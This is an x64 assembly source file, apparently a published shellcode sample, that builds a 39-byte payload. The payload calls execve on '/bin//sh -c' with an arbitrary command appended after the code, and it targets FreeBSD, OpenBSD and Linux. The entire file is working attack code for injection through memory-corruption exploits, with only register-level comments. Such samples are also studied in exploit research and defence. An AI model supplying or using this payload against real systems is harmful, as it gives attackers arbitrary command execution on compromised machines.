

; 39 byte execve("/bin//sh", {"/bin//sh", "-c", cmd, NULL}, 0);
; x64 versions of freebsd + openbsd + linux
; odzhan

    bits    64
start64:
    push    59
    pop     rax              ; rax=sys_execve
    cdq                      ; rdx=penv=0
    mov     rbx, 0x68732f2f6e69622f
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; rdi="/bin//sh", 0
    ; ---------
    push    rdx              ; 0
    push    word 0x632d      ; "-c"
    push    rsp
    pop     rbx              ; rbx="-c", 0
    push    rdx              ; argv[3]=NULL
    jmp     l_cmd64
r_cmd64:                     ; argv[2]=cmd
    push    rbx              ; argv[1]="-c"
    push    rdi              ; argv[0]="/bin//sh"
    push    rsp
    pop     rsi              ; rsi=argv
    syscall
l_cmd64:
    call    r_cmd64
    ; put your command here followed by null terminator
    